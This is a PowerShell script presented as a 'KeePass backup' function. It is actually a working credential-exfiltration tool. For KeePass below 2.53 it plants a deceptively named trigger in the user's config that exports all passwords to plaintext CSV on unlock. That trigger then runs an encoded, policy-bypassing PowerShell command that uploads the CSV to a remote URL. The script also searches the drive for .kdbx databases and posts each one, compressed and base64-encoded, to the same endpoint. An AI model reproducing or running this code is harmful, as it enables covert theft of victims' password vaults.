
function Invoke-KeePassBackup {
    # Parameters
    param (
    [Parameter(Position = 0, Mandatory = $true)]
    [string]$url
    )

    Write-Host "--------------- KeePass backup for $($env:USERNAME)@$($env:COMPUTERNAME)" -ForegroundColor Green

    # Pre-defined location
    $defaultPath = "C:\Program Files\KeePass Password Safe 2\KeePass.exe"

    # Check if KeePass exists at the pre-defined location
    if (Test-Path $defaultPath) {
        $keepassPath = $defaultPath
    } else {
        # If not found, then search for it
        $keepassPath = (Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter KeePass.exe).FullName | Select-Object -First 1
    }

    Write-Host "KeePass location: $keepassPath"

    # Fetch KeePass version
    $keepassVersion = (Get-Command $keepassPath).FileVersionInfo.ProductVersion
    Write-Host "KeePass version: $keepassVersion" -ForegroundColor Blue

    $tempLocation = [Environment]::GetEnvironmentVariable("TEMP", "User")

    # If KeePass version is less than 2.53 and -c switch is used
    if ([version]$keepassVersion -lt [version]"2.53") {

        $appData = [Environment]::GetEnvironmentVariable("APPDATA")
        $configFile = "$appData\KeePass\KeePass.config.xml"
        Write-Host "--------------- Adding an export trigger on config file: $configFile" -ForegroundColor Green

        # Backup current config file
        $backupFileName = "KeePass.config.backup.xml"
        $backupPath = Join-Path -Path $appData -ChildPath "KeePass\$backupFileName"
        Copy-Item -Path $configFile -Destination $backupPath
        Write-Host "Backup of current config file done at: $backupPath"

        # Set export location
        $filename = Join-Path -Path $tempLocation -ChildPath "KeePassBackup.csv"
        Write-Host "Export location: $filename"

        # Load the XML file into the $xml object
        $configXML = [xml](Get-Content $configFile)

        # Remove triggers
        $configXML.SelectNodes("//Triggers").RemoveAll()
        $configXML.Save($configFile)

        $exportCommands = '<Parameter>' + $filename + '</Parameter>'

        $fileNameValue = [System.IO.Path]::GetFileName($filename)
        $fullFileNameVar = "$env:USERNAME@$env:COMPUTERNAME-$fileNameValue"
        $uploadScript = "`$compressedStream = New-Object System.IO.MemoryStream; `$gzipStream = New-Object System.IO.Compression.GZipStream(`$compressedStream, [System.IO.Compression.CompressionMode]::Compress); `$bytesToWrite = [System.IO.File]::ReadAllBytes('$filename'); `$gzipStream.Write(`$bytesToWrite, 0, `$bytesToWrite.Length); `$gzipStream.Close(); `$encodedFile = [System.Convert]::ToBase64String(`$compressedStream.ToArray()); Invoke-RestMethod -Uri '$url' -Method Post -Headers @{ 'X-File-Name' = '$fullFileNameVar' } -Body `$encodedFile"

        $bytes = [Text.Encoding]::Unicode.GetBytes($uploadScript)
        $encodedCommands = [Convert]::ToBase64String($bytes)

        $uploadCommands = '<Parameter>-ep bypass -nop -e ' + $encodedCommands + '</Parameter>'

        # Trigger - upload
        $uploadAction = @"
<Action>
    <TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
    <Parameters>
        <Parameter>PowerShell.exe</Parameter>
        $uploadCommands
        <Parameter>False</Parameter>
        <Parameter>1</Parameter>
        <Parameter />
    </Parameters>
</Action>
"@

        # Trigger - export
        $TriggerXML = [xml] @"
<Trigger>
    <Guid>$([Convert]::ToBase64String([guid]::NewGuid().ToByteArray()))</Guid>
    <Name>Offline notepad style backup of passwords</Name>
    <Events>
        <Event>
            <TypeGuid>5f8TBoW4QYm5BvaeKztApw==</TypeGuid>
            <Parameters>
                <Parameter>0</Parameter>
                <Parameter />
            </Parameters>
        </Event>
    </Events>
    <Conditions />
    <Actions>
        <Action>
            <TypeGuid>D5prW87VRr65NO2xP5RIIg==</TypeGuid>
            <Parameters>
                $exportCommands
                <Parameter>KeePass CSV (1.x)</Parameter>
                <Parameter />
                <Parameter />
            </Parameters>
        </Action>
        $uploadAction
    </Actions>
</Trigger>
"@

        ForEach ($Object in $configFile) {
            # Determine the path from the object
            $KeePassXMLPath = switch ($true) {
                ($Object -is [String])                        { $Object }
                ($Object.PSObject.Properties['KeePassConfigPath']) { $Object.KeePassConfigPath }
                ($Object.PSObject.Properties['Path'])         { $Object.Path }
                ($Object.PSObject.Properties['FullName'])     { $Object.FullName }
                default                                       { [String]$Object }
            }

            if ($KeePassXMLPath -and ($KeePassXMLPath -match '.\.xml$') -and (Test-Path -Path $KeePassXMLPath)) {
                $KeePassXMLPath = Resolve-Path -Path $KeePassXMLPath

                $KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)

                $null = [GUID]::NewGuid().ToByteArray()

                if ($KeePassXML.Configuration.Application.TriggerSystem.Triggers -is [String]) {
                    $Triggers = $KeePassXML.CreateElement('Triggers')
                    $Null = $Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
                    $Null = $KeePassXML.Configuration.Application.TriggerSystem.ReplaceChild($Triggers, $KeePassXML.Configuration.Application.TriggerSystem.SelectSingleNode('Triggers'))
                } else {
                    $Null = $KeePassXML.Configuration.Application.TriggerSystem.Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
                }

                $KeePassXML.Save($KeePassXMLPath)

                Write-Host "Setup Complete!"
                Write-Host "To trigger the KeePass backup and upload, open your KeePass with master password."
            }
        }

    }
    Write-Host "--------------- Scanning for KeePass databases on $($env:COMPUTERNAME)" -ForegroundColor Green

    Get-ChildItem C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        $db = $_
        Write-Host "Found KeePass database at: $($db.FullName)" -ForegroundColor Blue
        $filename = $db.FullName
        $currentTimestamp = Get-Date -Format "yyyyMMdd"
        $file = "$env:USERNAME@$env:COMPUTERNAME-$currentTimestamp-" + [System.IO.Path]::GetFileName($db.FullName)

        # Compress the file data using GZip
        $compressedStream = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GZipStream($compressedStream, [System.IO.Compression.CompressionMode]::Compress)
        $gzipStream.Write([System.IO.File]::ReadAllBytes($filename), 0, [System.IO.File]::ReadAllBytes($filename).Length)
        $gzipStream.Close()

        # Convert the compressed data to Base64
        $encodedFile = [System.Convert]::ToBase64String($compressedStream.ToArray())

        try {
            Invoke-RestMethod -Uri $url -Method Post -Headers @{ "X-File-Name" = $file } -Body $encodedFile | Out-Null

            Write-Host "Uploaded $file successfully!"
        } catch {
            if ($_.Exception.Response.StatusCode.Value__ -eq 500) {
                Write-Host "Server responded with an error 500" -ForegroundColor Red
            } else {
                Write-Host "Error uploading the database: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }
}
